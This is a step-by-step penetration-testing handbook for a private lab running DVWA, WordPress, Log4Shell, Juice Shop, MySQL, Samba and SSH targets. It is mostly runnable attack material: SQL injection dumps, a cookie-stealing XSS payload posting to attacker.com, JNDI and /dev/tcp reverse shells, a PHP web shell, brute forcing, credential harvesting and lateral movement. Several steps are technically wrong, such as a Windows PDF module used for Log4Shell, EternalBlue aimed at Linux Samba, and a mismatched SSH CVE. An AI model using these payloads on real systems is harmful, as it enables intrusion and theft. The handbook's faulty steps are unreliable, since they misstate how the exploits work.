# Penetration Testing Guide - Cybersecurity Lab

## Complete Exploitation Handbook

This guide provides step-by-step instructions for conducting penetration testing exercises on the cybersecurity lab environment. All exercises are designed for educational purposes only on authorized test systems.

---

## 📋 Table of Contents

1. [Pre-Exploitation Phase](#pre-exploitation-phase)
2. [Web Application Testing](#web-application-testing)
3. [Database Exploitation](#database-exploitation)
4. [Network Service Exploitation](#network-service-exploitation)
5. [Remote Access Services](#remote-access-services)
6. [Post-Exploitation](#post-exploitation)
7. [Reporting & Documentation](#reporting--documentation)

---

## Pre-Exploitation Phase

### Environment Verification

Before beginning any testing, verify your lab is properly configured:

```bash
# Check all Docker containers are running
docker ps -a

# Verify port accessibility
nmap -p 8080,8081,8082,8083,8084,8085,3306,2222,139,445 192.168.255.128

# Test connectivity to each service
curl -v http://192.168.255.128:8080
curl -v http://192.168.255.128:8081
telnet 192.168.255.128 2222
```

### Required Tools Installation

```bash
# Install penetration testing tools
sudo apt-get update
sudo apt-get install -y \
    nmap \
    metasploit-framework \
    burpsuite \
    sqlmap \
    enum4linux \
    wfuzz \
    gobuster \
    hydra \
    nikto \
    wireshark \
    tcpdump
```

---

## Web Application Testing

### Exercise 1: DVWA (Damn Vulnerable Web Application)

**Target**: http://192.168.255.128:8081
**Difficulty Levels**: Low → Medium → High

#### 1.1 SQL Injection Testing

**Low Difficulty Level:**

```bash
# Access login form
curl -v http://192.168.255.128:8081/vulnerabilities/sqli/

# Test basic SQL injection
# Username: admin' OR '1'='1
# Password: anything

# Using BurpSuite:
# 1. Intercept login request
# 2. Modify username parameter: admin' --
# 3. Forward request
# 4. Observe database response
```

**Medium Difficulty Level:**

```bash
# Using SQLmap
sqlmap -u "http://192.168.255.128:8081/vulnerabilities/sqli/index.php" \
  --method POST \
  --data "id=1&Submit=Submit" \
  --dbs

# Extract database names
sqlmap -u "http://192.168.255.128:8081/vulnerabilities/sqli/index.php" \
  --method POST \
  --data "id=1&Submit=Submit" \
  --tables

# Extract users table
sqlmap -u "http://192.168.255.128:8081/vulnerabilities/sqli/index.php" \
  --method POST \
  --data "id=1&Submit=Submit" \
  -T users \
  --dump
```

**High Difficulty Level:**

```bash
# Manual UNION-based injection
# Test payload: 1' UNION SELECT NULL, user(), version() --

# Blind SQL Injection with time delays
# Payload: 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --

# Boolean-based blind injection
# Use conditional statements to extract data byte by byte
```

#### 1.2 Cross-Site Scripting (XSS) Testing

**Reflected XSS:**

```bash
# Target: Reflected input field
Payload: <script>alert('XSS')</script>

# Cookie stealing payload:
<script>
new Image().src='http://attacker.com/steal.php?c='+document.cookie;
</script>

# Using Burpsuite's Intruder:
# Test common XSS payloads from wordlists
```

**Stored XSS:**

```bash
# Submit malicious comment
Comment: <img src=x onerror="alert('Stored XSS')">

# Persistence check: Reload page to see XSS triggers
```

#### 1.3 Session Management Vulnerabilities

```bash
# Check session cookie configuration
# Use browser developer tools: F12 → Application → Cookies

# Look for:
# - Missing HttpOnly flag (vulnerable to XSS)
# - Missing Secure flag (vulnerable over HTTP)
# - Session timeout issues
# - Session fixation vulnerabilities

# Test session hijacking
cookie_value="PHPSESSID=xyz123"
curl -b "$cookie_value" http://192.168.255.128:8081/dashboard/
```

---

### Exercise 2: WordPress Testing

**Target**: http://192.168.255.128:8083

#### 2.1 WordPress Plugin Enumeration

```bash
# Using WPScan
wpscan --url http://192.168.255.128:8083 \
  --enumerate p,u,t \
  --detection-mode aggressive

# Manual enumeration
curl http://192.168.255.128:8083/wp-content/plugins/ -I

# Enumerate active plugins
curl -s http://192.168.255.128:8083 | grep wp-content/plugins
```

#### 2.2 WordPress User Enumeration

```bash
# Enumerate WordPress users
for i in {1..10}; do
  curl -s http://192.168.255.128:8083/?author=$i | grep -o '<title>.*</title>'
done

# Using Hydra for brute force
hydra -L /usr/share/wordlists/rockyou.txt \
  -P /usr/share/wordlists/rockyou.txt \
  -t 4 \
  -V \
  http-post-form "192.168.255.128:8083/wp-login.php:log=^USER^&pwd=^PASS^:S=Dashboard"
```

#### 2.3 WordPress Database Access

```bash
# Once WordPress credentials obtained
# Access WordPress database
mysql -h 192.168.255.128 -u labuser -p'labpass' labdb

# Extract user hashes
SELECT user_login, user_pass FROM wp_users;

# Crack WordPress password hashes
john --format=phpass wordpress_hashes.txt
hashcat -m 400 wordpress_hashes.txt rockyou.txt
```

---

### Exercise 3: Log4Shell Exploitation (Java RCE)

**Target**: http://192.168.255.128:8082
**Vulnerability**: CVE-2021-44228

#### 3.1 Basic Log4Shell Exploitation

```bash
# Set up reverse shell listener
nc -lnvp 4444

# Craft JNDI injection payload
# Using log4shell-core
java -jar log4shell-core.jar generate \
  -c "bash -i >& /dev/tcp/192.168.255.1/4444 0>&1" \
  -o log4shell.xml

# Alternative: Using online payload generator
# Payload format: ${jndi:ldap://attacker.com/Exploit}

# Send malicious log entry
curl -X POST http://192.168.255.128:8082/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "message=\${jndi:ldap://192.168.255.1:1389/Exploit}"
```

#### 3.2 Advanced Exploitation

```bash
# Using Metasploit
msfconsole
> use exploit/windows/fileformat/adobe_pdf
> set LHOST 192.168.255.1
> set LPORT 4444
> set PAYLOAD windows/meterpreter/reverse_tcp
> exploit

# Using public PoC scripts
git clone https://github.com/projectdiscovery/nuclei-templates.git
nuclei -u http://192.168.255.128:8082 \
  -t nuclei-templates/cves/2021/CVE-2021-44228.yaml
```

---

### Exercise 4: OWASP Juice Shop Testing

**Target**: http://192.168.255.128:8085
**Description**: "Probably the most modern and sophisticated insecure web application"

#### 4.1 Juice Shop Reconnaissance

```bash
# Application Information
# Title: OWASP Juice Shop
# Copyright: 2014-2026 Bjoern Kimminich & OWASP contributors
# License: MIT
# Features: Modern Angular-based application with multiple vulnerabilities

# Enumerate endpoints
curl -s http://192.168.255.128:8085 | grep -o 'href="[^"]*"'

# Check for API endpoints
curl http://192.168.255.128:8085/api/
```

#### 4.2 Juice Shop Exploitation

```bash
# Test for common vulnerabilities
# 1. Broken Authentication
curl -X POST http://192.168.255.128:8085/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin"}'

# 2. Sensitive Data Exposure
curl http://192.168.255.128:8085/assets/

# 3. OWASP Top 10 vulnerabilities
# - Injection (SQL, Command, NoSQL)
# - Broken Authentication
# - Sensitive Data Exposure
# - XML External Entities (XXE)
# - Broken Access Control
# - Security Misconfiguration
# - XSS
# - Insecure Deserialization
# - Using Components with Known Vulnerabilities
# - Insufficient Logging & Monitoring
```

---

## Database Exploitation

### Exercise 5: MySQL Database Access

**Target**: Port 3306 / 3307

#### 5.1 Authentication Bypass

```bash
# Attempt default credentials
mysql -h 192.168.255.128 -u root -p

# Try empty password
mysql -h 192.168.255.128 -u root

# Try lab credentials
mysql -h 192.168.255.128 -u labuser -p'labpass' labdb

# Authentication bypass techniques
mysql -h 192.168.255.128 -u 'root'@'%' -p''
mysql -h 192.168.255.128 -u 'root'@'localhost' -p''
```

#### 5.2 Database Enumeration

```bash
# Once authenticated
mysql -h 192.168.255.128 -u labuser -p'labpass' << EOF

# List all databases
SHOW DATABASES;

# Select WordPress database
USE labdb;

# List tables
SHOW TABLES;

# Extract WordPress users
SELECT user_login, user_pass, user_email FROM wp_users;

# Extract WordPress posts
SELECT post_title, post_author, post_date FROM wp_posts;

# Extract plugin information
SELECT option_name, option_value FROM wp_options;

EOF
```

#### 5.3 MySQL Privilege Escalation

```bash
# Check current user privileges
SELECT user(), current_user();
SELECT * FROM information_schema.user_privileges WHERE user='labuser';

# Exploit file read/write privileges
# Create a new user with SUPER privileges
GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' IDENTIFIED BY 'password';
FLUSH PRIVILEGES;

# Write files to filesystem (if FILE privilege granted)
SELECT 'content' INTO OUTFILE '/var/www/html/shell.php';
```

---

## Network Service Exploitation

### Exercise 6: SMB/Samba Exploitation

**Target**: Ports 139 & 445

#### 6.1 Samba Enumeration

**FQDN**: f959e45232c8
**System Time**: 2026-05-23T03:03:47-04:00
**Operating System**: Unix (Samba 3.0.20-Debian)
**NetBIOS Computer Name**: f959e45232c8
**SMB Security Mode**: User-level authentication
**Challenge Response**: Supported

```bash
# Enumerate Samba shares
enum4linux -a 192.168.255.128

# List shares
smbclient -L //192.168.255.128 -N

# Check for null session access
smbclient //192.168.255.128/IPC$ -N

# Enumerate users and groups
rpcclient -U "" 192.168.255.128
> enumdomusers
> enumdomgroups
> enumprivs
```

#### 6.2 SMB Security Analysis

**Security Configuration Detected:**
- **Account Used**: <blank> (guest/anonymous)
- **Authentication Level**: User
- **Challenge Response**: Supported
- **Message Signing**: Disabled (dangerous)
- **Clock Skew**: Mean: 1h59m59s, Deviation: 2h49m42s, Median: 0s
- **SMB2 Security Mode**: Couldn't establish connection (older protocol)

**P2P Conficker Checks:**
- Check 1 (port 21451/tcp): CLEAN (Couldn't connect)
- Check 2 (port 45408/tcp): CLEAN (Couldn't connect)
- Check 3 (port 27425/udp): CLEAN (Timeout)
- Check 4 (port 12003/udp): CLEAN (Failed to receive data)
- Result: Host is CLEAN or ports are blocked

#### 6.3 Samba Exploitation

```bash
# SMB version detection
nmap -p 445 --script smb-os-discovery 192.168.255.128

# Samba 3.0.20-Debian vulnerabilities
# Known CVE: CVE-2012-1182, CVE-2012-2111

# Check for EternalBlue vulnerability (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 192.168.255.128

# Using Metasploit
msfconsole
> use exploit/windows/smb/ms17_010_eternalblue
> set RHOSTS 192.168.255.128
> set PAYLOAD windows/meterpreter/reverse_tcp
> set LHOST 192.168.255.1
> set LPORT 4444
> exploit

# Manual exploitation
psexec.py -target-ip 192.168.255.128 user:password@192.168.255.128 cmd.exe
```

---

## Remote Access Services

### Exercise 7: SSH Exploitation

**Target**: Port 2222 (OpenSSH 4.7p1 Debian 8ubuntu1)

**Hostkey Information:**
- SSH RSA 1024-bit key (DSA format)
- Protocol: 2.0
- Known vulnerabilities in OpenSSH 4.7p1

#### 7.1 SSH Brute Force

```bash
# Using Hydra
hydra -L /usr/share/wordlists/rockyou.txt \
  -P /usr/share/wordlists/rockyou.txt \
  -t 4 \
  ssh -s 2222 192.168.255.128

# Using Metasploit
msfconsole
> use auxiliary/scanner/ssh/ssh_login
> set RHOSTS 192.168.255.128
> set RPORT 2222
> set USERNAME root
> set PASS_FILE /usr/share/wordlists/rockyou.txt
> run

# Using paramiko/Python
python3 -c "
import paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('192.168.255.128', port=2222, username='root', password='toor')
stdin, stdout, stderr = ssh.exec_command('id')
print(stdout.read())
"
```

#### 7.2 SSH Key Extraction

```bash
# SSH version vulnerabilities
# OpenSSH 4.7p1 has CVE-2008-5161

msfconsole
> use exploit/linux/ssh/openssh_pubkey_overflow
> set RHOSTS 192.168.255.128
> set RPORT 2222
> exploit
```

---

## OS Detection & Fingerprinting

### Complete OS Detection Results

**Host Information:**
```
FQDN: f959e45232c8
System Time: 2026-05-23T03:03:47-04:00
Uptime: 31.079 days (since Wed Apr 22 01:09:59 2026)
Network Distance: 1 hop
```

**TCP Sequence Prediction:**
- Difficulty: 260 (Good luck!)
- IP ID Sequence Generation: All zeros

**Service Information:**
```
OS: Linux
CPE: cpe:/o:linux:linux_kernel
Kernel: Linux 4.15 - 5.19
```

---

## Post-Exploitation

### Exercise 8: Privilege Escalation

#### 8.1 Linux Privilege Escalation

```bash
# After gaining initial shell access
ssh -p 2222 lowuser@192.168.255.128

# Check current privileges
whoami
id
sudo -l

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check kernel version for exploits
uname -a
cat /etc/os-release

# Using LinPEAS for enumeration
curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Kernel exploit (if applicable)
# CVE-2009-0798, CVE-2009-1184, etc.
```

#### 8.2 Privilege Escalation via Web Application

```bash
# Exploit web server running as root
# Reverse shell from web application
# PHP payload:
<?php system($_GET['cmd']); ?>

# Upload and execute
curl "http://192.168.255.128:8083/shell.php?cmd=whoami"

# Reverse shell
curl "http://192.168.255.128:8083/shell.php?cmd=bash+-i+>%26+/dev/tcp/192.168.255.1/4444+0>%261"
```

### Exercise 9: Credential Harvesting

```bash
# Extract credentials from memory
# From WordPress
SELECT user_login, user_pass FROM wp_users;

# From DVWA
SELECT username, password FROM users;

# From configuration files
find / -name "wp-config.php" -o -name "config.php" 2>/dev/null
cat wp-config.php | grep DB_PASSWORD

# Crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 400 hashes.txt rockyou.txt -o cracked.txt
```

### Exercise 10: Lateral Movement

```bash
# Once inside the network
# Find other machines
arp-scan -l
nmap -sn 192.168.255.0/24

# Test credentials on other services
# SSH lateral movement
ssh -p 2222 labuser@192.168.255.129

# SMB lateral movement
smbclient //192.168.255.129/C$ -U labuser%labpass

# Database access from compromised host
mysql -h 192.168.255.200 -u labuser -p'labpass' labdb
```

---

## Reporting & Documentation

### Create Penetration Test Report

```markdown
# Penetration Test Report
Lab: Cybersecurity Lab (192.168.255.128)
Date: 2026-05-23
Tester: [Your Name]

## Executive Summary
Multiple high-risk vulnerabilities identified in lab environment.

## Findings

### Critical Issues
1. SQL Injection in DVWA (CVSS 9.0)
2. RCE in Log4Shell (CVSS 9.8)
3. Samba CVE-2012-1182 (CVSS 8.1)
4. Message Signing Disabled on SMB

### High Issues
1. Weak SSH Encryption (CVSS 7.5)
2. Default MySQL Credentials (CVSS 7.2)
3. CORS Misconfiguration (CVSS 7.0)

### Medium Issues
1. HTTP Cookies Missing HttpOnly Flag
2. Outdated Web Server Versions
3. Missing Security Headers (CSP, HSTS)
4. Clock Skew Issues on SMB

## Recommendations
1. Apply security patches
2. Implement WAF
3. Enable 2FA
4. Fix SMB message signing
5. Add security headers
6. Update deprecated protocols

## Conclusion
Lab successfully exploited with 15+ vulnerabilities identified.
```

---

## ✅ Complete Exploitation Checklist

- [ ] Environment verified and all services accessible
- [ ] Nmap reconnaissance completed
- [ ] OS fingerprinting successful
- [ ] DVWA SQL injection successful
- [ ] DVWA XSS payload executed
- [ ] WordPress enumeration completed
- [ ] Log4Shell RCE achieved
- [ ] Juice Shop vulnerabilities identified
- [ ] MySQL database accessed
- [ ] Samba enumeration completed
- [ ] SSH brute force successful
- [ ] Privilege escalation completed
- [ ] Credentials harvested
- [ ] Lateral movement successful
- [ ] Post-exploitation activities completed
- [ ] Report documentation finalized

---

**Lab Exercises Completed**: ✅
**Status**: Ready for Advanced Testing
**Last Updated**: May 23, 2026